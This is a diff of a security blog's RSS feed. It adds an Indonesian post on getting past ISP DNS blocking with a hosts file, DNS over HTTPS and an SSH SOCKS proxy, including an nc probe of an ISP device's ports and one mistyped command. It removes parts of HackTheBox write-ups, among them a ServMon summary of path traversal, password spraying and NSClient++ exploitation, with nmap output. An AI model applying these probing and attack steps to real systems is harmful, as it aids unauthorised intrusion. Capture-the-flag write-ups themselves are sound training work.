@@ -7,6 +7,281 @@
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Thu, 04 Nov 2021 16:40:44 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/tunneling/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Hosts file, DNS over HTTPS dan SSH SOCKS Proxy</title>
+      <link>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</link>
+      <pubDate>Thu, 04 Nov 2021 16:40:44 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</guid>
+      <description>Can we use these to bypass DNS filters and conceal ourselves from ISPs? Let&amp;#39;s find out!</description>
+      <content:encoded><![CDATA[<p>Saat ini sebagian besar browser-browser populer sudah memiliki fitur <a href="https://developers.cloudflare.com/1.1.1.1/encrypted-dns">DNS over HTTPS (DoH)</a>. Tapi meskipun begitu, ternyata masih banyak yang belum tahu tentang adanya fitur ini.</p>
+<figure>
+    <img src="imgs/image-20211104224726768.png"
+         alt="Settingan DoH pada Chrome dan Firefox"/> <figcaption>
+            <p>Settingan DoH pada Chrome dan Firefox
+            </p>
+        </figcaption>
+</figure>
+
+<p><em><strong>Loh tahu dari mana?</strong></em></p>
+<p><em>Flashback</em> sedikit, jadi ada beberapa teman yang setiap kali mau mengakses reddit atau web streaming anime <del>ilegal</del> legal, mereka harus pakai VPN untuk bypass blokirannya ISP. Karena VPN-nya ini gratisan (baca: dipakai berjamaah dan di-limit), sudah pasti jatuhnya lemot.</p>
+<p>Dan setelah mereka tahu soal fitur DoH, salah satunya memberi respon berikut:</p>
+<figure>
+    <img src="imgs/image-20211103210137432.png"
+         alt="Sebuah testimoni"/> <figcaption>
+            <p>Sebuah testimoni
+            </p>
+        </figcaption>
+</figure>
+
+<p>Agak risih juga sebenarnya ISP di negara polandsia mainnya block-block situs via DNS.</p>
+<p>Nah di postingan ini gw akan coba bahas kenapa DoH bisa dipakai untuk mem-<em>bypass</em> website yang diblokir. Selanjutnya gw juga akan menggunakan dua cara alternatif untuk melakukan bypass (tanpa VPN) dan mencari tahu apakah cara&quot; tersebut sudah cukup untuk menyembunyikan kita dari ISP.</p>
+<h2 id="how-do-isps-block-websites">How do ISPs block websites?</h2>
+<p>Normalnya ketika kita mengakses sebuah situs, misal <code>www.reddit.com</code>, komputer kita akan mengirimkan sebuah kueri DNS ke sebuah DNS server untuk menanyakan alamat IP dari domain <code>www.reddit.com</code> agar halaman situs tersebut bisa dimuat kemudian. Kueri DNS ini umumnya memang diarahkan ke DNS server milik ISP/operator seluler yang kamu pakai.</p>
+<p>Nah ketika kita mengakses situs yang ternyata nama domain-nya tercatat di &ldquo;daftar hitam&rdquo;-nya DNS server ISP, maka DNS server tersebut akan otomatis meng-<em>overwrite</em> alamat IP dari domain tersebut dengan alamat IP yang biasanya adalah halaman blokir milik si ISP seperti merconsuar, ipo, dll.</p>
+<p>Kita bisa liat alur-nya secara detail dengan WireShark, tetapi agar lebih simple, kita juga bisa menggunakan <code>tracert</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ tracert -4 -d -h <span class="m">5</span> www.reddit.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Tracing route to blockpage.****.id <span class="o">[</span>***.215.197.131<span class="o">]</span> 
+</span></span><span class="line"><span class="cl">over a maximum of <span class="m">5</span> hops:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="m">1</span>     <span class="m">2</span> ms     <span class="m">2</span> ms     <span class="m">2</span> ms  192.168.1.1 
+</span></span><span class="line"><span class="cl">  <span class="m">2</span>     *        *        *     Request timed out.
+</span></span><span class="line"><span class="cl">  <span class="m">3</span>    <span class="m">38</span> ms    <span class="m">32</span> ms    <span class="m">24</span> ms  10.***.44.1 
+</span></span><span class="line"><span class="cl">  <span class="m">4</span>    <span class="m">26</span> ms    <span class="m">31</span> ms    <span class="m">22</span> ms  ***.215.248.78 
+</span></span><span class="line"><span class="cl">  <span class="m">5</span>    <span class="m">33</span> ms    <span class="m">25</span> ms    <span class="m">27</span> ms  ***.215.248.82 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Trace complete.
+</span></span></code></pre></div><blockquote>
+<p>Di hop kedua gw kurang yakin apakah modem ADSL tidak punya/punya hop count seperti router yang akhirnya tracert menampilkan timeout, atahu memang pure timeout.</p>
+</blockquote>
+<p>Berdasarkan hasil <code>tracert</code> diatas, situs <code>www.reddit.com</code> diterjemahkan ke <code>blockpage.sensor.id</code> yang alamat IPnya <code>***.215.248.131</code>. Kita bisa validasi ini apakah situs reddit benar menggunakan alamat IP <code>***.215.248.131</code> menggunakan <a href="https://toolbox.googleapps.com/apps/dig/#A/">Google Toolbox: dig</a>. Dan hasilnya adalah:</p>
+<figure>
+    <img src="imgs/image-20211104095424598.png"
+         alt="Hasil dig www.reddit.com"/> <figcaption>
+            <p>Hasil dig <a href="https://www.reddit.com">www.reddit.com</a>
+            </p>
+        </figcaption>
+</figure>
+
+<p>Oke ternyata alamat dari <code>www.reddit.com</code> adalah <code>151.101.X.140</code>, bukan <code>***.215.197.131</code>!</p>
+<p>Yah komputernya kena penipuan :/</p>
+<p>Anyway, alur <em>request</em>-nya bisa diilustrasikan seperti berikut.</p>
+<figure>
+    <img src="imgs/image-20211103163418666.png"
+         alt="Ilustrasi(nya)"/> <figcaption>
+            <p>Ilustrasi(nya)
+            </p>
+        </figcaption>
+</figure>
+
+<p><em><strong>Darimana gw tau 10.***.44.1 itu router ISP?</strong></em></p>
+<p>Nope, gw gak tau itu router atau bukan, tapi perangkat ini punya port SSH dan SNMP, jadi kemungkinan perangkat ini di monitor.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ nc -vn 10.***.44.1 <span class="m">22</span>
+</span></span><span class="line"><span class="cl">Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
+</span></span><span class="line"><span class="cl">Ncat: Connected to 10.***.44.1:22.
+</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_7.5
+</span></span><span class="line"><span class="cl">$ nc -u -vn 10.***.44.1 <span class="m">161</span>
+</span></span><span class="line"><span class="cl">Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
+</span></span><span class="line"><span class="cl">Ncat: Connected to 10.***.44.1:161
+</span></span></code></pre></div><p><em><strong>Tapi kan HTTPS, kok bisa ISP tau?</strong></em></p>
+<p>Enkripsi HTTPS/TLS itu ada di bagian kontennya<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, sedangkan paket-paket DNS yang berupa kueri untuk me-<em>resolve</em> nama domain ke sebuah alamat IP tidak masuk ke dalam enkripsi tersebut (std port HTTPS: 443, port DNS: 53). Dan kueri DNS itu mendahului trafik HTTP/S</p>
+<p>Jadi misalnya ketika kita melakukan login di suatu HTTPS website, ISP seharusnya gak akan tahu username dan password yang kita masukkan, bentukan login page tersebut dan bahkan sampai ke <em>endpoint</em> URLnya (<code>website.com/api/v1/login/?username=admin&amp;password=admin123</code>).</p>
+<figure>
+    <img src="imgs/image-20211104092043412.png"
+         alt="Contoh konten yang dienkripsi"/> <figcaption>
+            <p>Contoh konten yang dienkripsi
+            </p>
+        </figcaption>
+</figure>
+
+<p>Dengan kata lain, ISP hanya tahu tujuan kita mau kemana, tapi dia (seharusnya) gak bisa lihat apa yang kita lakukan di tempat tujuan itu.</p>
+<p>Sampai disini, tentunya kita bisa menyimpulkan sendiri kenapa DoH bisa membuat komputer kita menghindari &ldquo;penipuan&rdquo; yang dilakukan DNS server ISP tersebut.</p>
+<p>Yap, karena kueri DNSnya dibungkus HTTPS.</p>
+<p>Awalnya DNS kueri dikirimkan tanpa enkripsi ke DNS server ISP melalui port 53, tapi dengan DoH, DNS kueri ini sekarang di <em>deliver</em> melalui HTTPS ke <em>endpoint</em> DoH yang juga HTTPS, misalnya Cloudflare: <a href="https://cloudflare-dns.com/dns-query">https://cloudflare-dns.com/dns-query</a>.</p>
+<p><em><strong>Terus cloudflare-dns.com di resolve siapa?</strong></em></p>
+<p>DNSnya ISP lah wkwkw..</p>
+<p>Yah ketahuan kan pakai DoH. But tenang, kita bisa pakai versi IP 1^4-nya*</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;accept: application/dns-json&#39;</span> <span class="s2">&#34;https://1.1.1.1/dns-query?name=www.reddit.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;Status&#34;</span>:0,<span class="s2">&#34;TC&#34;</span>:false,<span class="s2">&#34;RD&#34;</span>:true,<span class="s2">&#34;RA&#34;</span>:true,<span class="s2">&#34;AD&#34;</span>:false,<span class="s2">&#34;CD&#34;</span>:false,<span class="s2">&#34;Question&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;www.reddit.com&#34;</span>,<span class="s2">&#34;type&#34;</span>:1<span class="o">}]</span>,<span class="s2">&#34;Answer&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;www.reddit.com&#34;</span>,<span class="s2">&#34;type&#34;</span>:5,<span class="s2">&#34;TTL&#34;</span>:288,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net.&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.65.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.129.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.193.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.1.140&#34;</span><span class="o">}]}</span>
+</span></span></code></pre></div><blockquote>
+<p>* tetap ketahuan sih karena dari IPnya wkwkw</p>
+</blockquote>
+<h2 id="thou-shalt-bypass">Thou Shalt (By)Pass</h2>
+<h3 id="hosts-file-the-primivite-dns">Hosts file: The Primivite DNS</h3>
+<p>Tanpa DoH, sebenarnya kita bisa menghindari &ldquo;penipuan&rdquo; alamat IP tersebut di level <em>cache</em>.</p>
+<p>Kita tahu bahwa alasan komputer kita membuat DNS kueri terlebih dahulu ke DNS server saat akan mengakses sebuah situs web adalah karena si komputer belum tahu alamat IP dari domain situs web yang kita maksud. Setelah si komputer tahu, alamat IP dan domain situs web ini akan di simpan pada DNS Resolver cache. Di <em>request</em> selanjutnya, si komputer akan mengandalkan daftar cache yang ada (selama belum <em>expired</em>).</p>
+<p>Pada Windows, kita bisa melihat daftar IP dan nama domain yang sudah di cache dengan menjalankan perintah berikut.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ifconfig /displaydns
+</span></span></code></pre></div><p>DNS server sendiri pada dasarnya hanyalah sekumpulan entry yang me-<em>mapping</em> alamat IP dengan nama domain secara dinamik. Pada level OS, terdapat sebuah file yang merupakan bentukan primivite dari DNS bersifat statik, yaitu file <code>hosts</code>.</p>
+<p>File <code>hosts</code> Windows bisa ditemukan di <code>C:\Windows\System32\drivers\etc\hosts</code> sedangkan untuk Unix-like, file <code>hosts</code> terdapat di <code>/etc/hosts</code>. Karena gw pengguna Windows, yang akan di bahas disini adalah <code>hosts</code> file Windows saja (pengguna Linux rata-rata sudah suhu soalnya).</p>
+<figure>
+    <img src="imgs/image-20211104123812239.png"
+         alt="Windows hosts file"/> <figcaption>
+            <p>Windows hosts file
+            </p>
+        </figcaption>
+</figure>
+
+<p>Pada Windows, file <code>hosts</code> ini akan selalu di-<em>load</em> ke dalam DNS Resolve cache, dan kita bisa memanfaatkan ini untuk memberi tahu komputer secara langsung bahwa alamat IP, misalnya <code>www.reddit.com</code>, adalah <code>151.101.129.140</code>. Caranya memberi tahunya adalah dengan menambahkan sebuah entry ke dalam file <code>hosts</code> dengan format berikut.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># [Alamat IP] [domain name 1] [domain name 2] [domain name N]
+</span></span><span class="line"><span class="cl">151.101.129.140 reddit.com www.reddit.com
+</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20211104131236469.png" alt="image-20211104131236469"  /></div>
+</p>
+<p>Sekarang kita bisa jalankan kembali perintah yang sama untuk menampilkan DNS cache, tapi sebelum itu ada baiknya DNS cache ini di-<em>flush</em> terlebih dulu.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ipconfig /flushdns <span class="c1"># clear cache dulu untuk menghilangkan brainwash dari DNS server ISP</span>
+</span></span><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ipconfig /displaydns
+</span></span></code></pre></div><p>Seharusnya saat ini <code>www.reddit.com</code> dan <code>reddit.com</code> berada di entry paling atas.</p>
+<p>Karena si komputer sudah tahu alamat IP dari <code>www.reddit.com</code>, maka dia tidak perlu lagi &ldquo;bertanya&rdquo; ke DNS server ISP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ tracert -d www.reddit.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Tracing route to reddit.com <span class="o">[</span>151.101.129.140<span class="o">]</span>
+</span></span><span class="line"><span class="cl">over a maximum of <span class="m">30</span> hops:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="m">1</span>   <span class="m">120</span> ms     <span class="m">2</span> ms     <span class="m">3</span> ms  192.168.43.1
+</span></span><span class="line"><span class="cl">  <span class="m">2</span>     *        *        *     Request timed out.
+</span></span><span class="line"><span class="cl">  <span class="m">3</span>   <span class="m">162</span> ms    <span class="m">26</span> ms    <span class="m">26</span> ms  10.***.44.2
+</span></span><span class="line"><span class="cl">  <span class="m">4</span>   <span class="m">160</span> ms    <span class="m">25</span> ms    <span class="m">30</span> ms  ***.215.36.238 
+</span></span><span class="line"><span class="cl">  <span class="m">5</span>   <span class="m">187</span> ms    <span class="m">46</span> ms    <span class="m">46</span> ms  180.87.12.233
+</span></span><span class="line"><span class="cl">  <span class="m">6</span>   <span class="m">186</span> ms    <span class="m">57</span> ms    <span class="m">50</span> ms  180.87.12.232
+</span></span><span class="line"><span class="cl">  <span class="m">7</span>   <span class="m">191</span> ms    <span class="m">49</span> ms    <span class="m">47</span> ms  180.87.12.250
+</span></span><span class="line"><span class="cl">  <span class="m">8</span>    <span class="m">49</span> ms    <span class="m">49</span> ms    <span class="m">48</span> ms  210.57.30.38
+</span></span><span class="line"><span class="cl">  <span class="m">9</span>   <span class="m">188</span> ms    <span class="m">53</span> ms    <span class="m">52</span> ms  202.84.219.174
+</span></span><span class="line"><span class="cl"> <span class="m">10</span>    <span class="m">70</span> ms    <span class="m">49</span> ms    <span class="m">52</span> ms  202.84.219.174
+</span></span><span class="line"><span class="cl"> <span class="m">11</span>    <span class="m">60</span> ms    <span class="m">54</span> ms    <span class="m">49</span> ms  202.84.224.197
+</span></span><span class="line"><span class="cl"> <span class="m">12</span>    <span class="m">83</span> ms    <span class="m">80</span> ms    <span class="m">85</span> ms  210.57.38.171
+</span></span><span class="line"><span class="cl"> <span class="m">13</span>   <span class="m">205</span> ms   <span class="m">200</span> ms   <span class="m">203</span> ms  151.101.129.140 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Trace complete.
+</span></span></code></pre></div><p><em><strong>Kalau untuk website lain gimana?</strong></em></p>
+<p>Google Toolbox!</p>
+<p>Jadi kamu bisa <em>resolve</em> dulu IPnya menggunakan Google Toolbox: dig.</p>
+<p><div class="img-container"><img src="imgs/image-20211104142819468.png" alt="image-20211104142819468"  /></div>
+</p>
+<p>Lalu tambahkan record tersebut ke <code>hosts</code> file:</p>
+<p><div class="img-container"><img src="imgs/image-20211104142858365.png" alt="image-20211104142858365"  /></div>
+</p>
+<h3 id="ssh-socks-proxy--doh">SSH SOCKS Proxy + DoH</h3>
+<p>Penggunaan <code>host</code> file dan DoH memang bisa mem-<em>bypass</em> Website, tapi pihak ISP tetap bisa mengetahui kita mengakses situs dan domain apa.</p>
+<p>Untuk menghindari itu, salah satu cara &lsquo;murah&rsquo; dan mudah yang gw gunakan selain VPN adalah menggunakan <em>private server</em> lalu memanfaatkan fitur builtin SOCKS <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy</a> dari SSH (jatuhnya transparan). <em>Private server</em> yang gw pakai itu gw deploy sendiri di Microsoft Azure.</p>
+<blockquote>
+<p>Jika dari pembaca ada yang masih berstatus &lsquo;student&rsquo;, silahkan cek link berikut:</p>
+<ul>
+<li><a href="https://azure.microsoft.com/en-us/free/students/">https://azure.microsoft.com/en-us/free/students/</a></li>
+</ul>
+</blockquote>
+<p>Untuk memanfaatkan SSH tunnel sebagai SOCKS proxy, perintahnya cukup simple:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh -i az_vm.key fproxy-user@20.109.***.213 -D <span class="m">1080</span> -N
+</span></span></code></pre></div><ul>
+<li><code>-D 1080</code>: Buka SOCKS proxy di port 1080 (listen)</li>
+<li><code>-N</code>: Tanpa interactive shell.</li>
+</ul>
+<p>Saat ini SOCKS Proxy via SSH sudah tersedia di <code>127.0.0.1</code> port <code>1080</code>, dan kita tinggal mengkonfigurasikan setting-an proxy pada browser seperti berikut:</p>
+<figure>
+    <img src="imgs/image-20211104161049841.png"
+         alt="Firefox proxy settings"/> <figcaption>
+            <p>Firefox proxy settings
+            </p>
+        </figcaption>
+</figure>
+
+<p>Mudah kan?</p>
+<p>Untuk memudahkan proses switching proxy-unproxy, gw pakai ekstensi browser bernama <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a>. Jadi gak harus buka-buka settingan browser lagi. Berikut tampilannya.</p>
+<figure>
+    <img src="imgs/image-20211104160902204.png"
+         alt="FoxyProxy Toogle"/> <figcaption>
+            <p>FoxyProxy Toogle
+            </p>
+        </figcaption>
+</figure>
+
+<p>Konfigurasinya? sama dengan settingan browser!</p>
+<figure>
+    <img src="imgs/image-20211104090204141.png"
+         alt="Konfigurasi SOCKS Proxy di Foxy Proxy"/> <figcaption>
+            <p>Konfigurasi SOCKS Proxy di Foxy Proxy
+            </p>
+        </figcaption>
+</figure>
+
+<p>Dengan mengirimkan <em>request</em> ke <code>ifconfig.co/json</code>, saat ini IP gw adalah IP dari si private server.</p>
+<figure>
+    <img src="imgs/image-20211104090145368.png"
+         alt="Akses ifconfig.co dengan proxy"/> <figcaption>
+            <p>Akses ifconfig.co dengan proxy
+            </p>
+        </figcaption>
+</figure>
+
+<p>Lalu ditambah dengan DoH dan di test lewat <a href="https://dnsleaktest.com/">https://dnsleaktest.com/</a> hasilnya adalah:</p>
+<figure>
+    <img src="imgs/image-20211104090533201.png"
+         alt="Test DNS leak dengan DoH aktif"/> <figcaption>
+            <p>Test DNS leak dengan DoH aktif
+            </p>
+        </figcaption>
+</figure>
+
+<p>Sampai sini seharusnya ISP kurang lebih hanya melihat komputer gw yang mengakses si private server dengan trafik seperti berikut.</p>
+<figure>
+    <img src="imgs/image-20211104152555436.png"
+         alt="Web trafic yang terenkripsi melalui SSH tunnel"/> <figcaption>
+            <p>Web trafic yang terenkripsi melalui SSH tunnel
+            </p>
+        </figcaption>
+</figure>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>Selain menggunakan VPN, setidaknya ada 3 solusi di postingan ini yang bisa kamu coba untuk mem-bypass DNS filter yang diterapkan oleh ISP langganan kamu:</p>
+<ul>
+<li>Hosts file,</li>
+<li>DoH,</li>
+<li>SSH SOCKS Proxy + DoH.</li>
+</ul>
+<p>Menggunakan <code>hosts</code> file dan DoH hanya sebatas menghindari komputer kita dari &ldquo;penipuan&rdquo; alamat palsu oleh DNS server ISP. Sedangkan untuk &ldquo;SSH SOCKS Proxy + Doh&rdquo;, selain menghindari &ldquo;penipuan&rdquo;, tunnel yang dibuat juga mengenkripsi keseluruhan trafik web kita.</p>
+<p>Hasil <em>testing</em> ketiganya, bukan <em>testing</em> sih, bisa ditabelkan(?) seperti berikut.</p>
+<div class="force-center">
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Bypass DNS filters</th>
+<th>Hide the domain we visit ?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hosts file</td>
+<td>Probably yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td>DoH</td>
+<td>Yes, mostly</td>
+<td>No</td>
+</tr>
+<tr>
+<td>DoH + SSH SOCKS Proxy</td>
+<td>Yes, mostly, but it depends.</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><em><strong>Apakah dengan ini gw sudah bisa menjadi <del>seperti  bjoorka</del> anonymous user?</strong></em></p>
+<p>Nope, karena private server yang gw pakai pun milik sesuatu yang lebih besar dari ISP dan dua-duanya mengumpulkan data juga.</p>
+<p>Baiklah, sekian untuk postingan ini. See you in the next post.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://https.cio.gov/faq/#what-does-https-do">https://https.cio.gov/faq/#what-does-https-do</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+]]></content:encoded>
+    </item>
+    
+    <item>
       <title>Hosts file, DNS over HTTPS dan SSH SOCKS Proxy [ID]</title>
       <link>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</link>
       <pubDate>Thu, 04 Nov 2021 16:40:44 +0700</pubDate>
@@ -1524,275 +1799,6 @@
 </span></span></code></pre></div><p>On my listener:</p>
 <img src="imgs/image-20210502164625103.png" alt="image-20210502164625103" style="zoom:67%;" />
 <p>Now I can grab the root flag or dump the hashes.</p>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - ServMon</title>
-      <link>https://fahmifj.github.io/hackthebox/servmon/</link>
-      <pubDate>Fri, 19 Jun 2020 21:12:21 +0000</pubDate>
-      
-      <guid>https://fahmifj.github.io/hackthebox/servmon/</guid>
-      <description>Exploiting embedded system software</description>
-      <content:encoded><![CDATA[<p>ServMon starts with FTP anonymous access that allows me to read the users&rsquo; notes. One of these notes contains a hint to a location of a password list in one of the user&rsquo;s dekstops. This machine hosts a NVMS-1000 which is vulnerable to path traversal attack and is exploited to obtain the password list. With a password spray attack, I&rsquo;m able to gain a foothold on the system . Inside the machine, there is a config file of NSClient++, in which it contains a set of credentials. With these credentials, I can use public exploits for NSClient++ and gain interactive shell access as NT Authority\System.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Directory/Path Traversal</li>
-<li>NVMS-1000 exploitation</li>
-<li>NSClient-0.5.2.35 exploitation</li>
-<li>Port Forwarding/Tunneling</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
-<li>Burp Suite</li>
-<li><a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">NSClient-0.5.2.35 Exploit PoC</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
-</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/initial-servmon <span class="s1">&#39;10.10.10.184&#39;</span>
-</span></span><span class="line"><span class="cl">...
-</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
-</span></span><span class="line"><span class="cl">21/tcp   open  ftp           Microsoft ftpd
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_01-18-20  12:05PM       &lt;DIR&gt;          Users
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  SYST: Windows_NT
-</span></span><span class="line"><span class="cl">22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp   open  http
-</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest, HTTPOptions, RTSPRequest: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-type: text/html
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">340</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     AuthInfo: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html PUBLIC <span class="s2">&#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;</span> <span class="s2">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;</span>&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">&#34;http://www.w3.org/1999/xhtml&#34;</span>&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;&lt;/title&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span>&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     window.location.href <span class="o">=</span> <span class="s2">&#34;Pages/login.htm&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/script&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/head&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;body&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/body&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/html&gt;
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">408</span> Request Timeout
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-type: text/html
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_    AuthInfo:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
-</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
-</span></span><span class="line"><span class="cl">5666/tcp open  tcpwrapped
-</span></span><span class="line"><span class="cl">6699/tcp open  napster?
-</span></span><span class="line"><span class="cl">8443/tcp open  ssl/https-alt
-</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
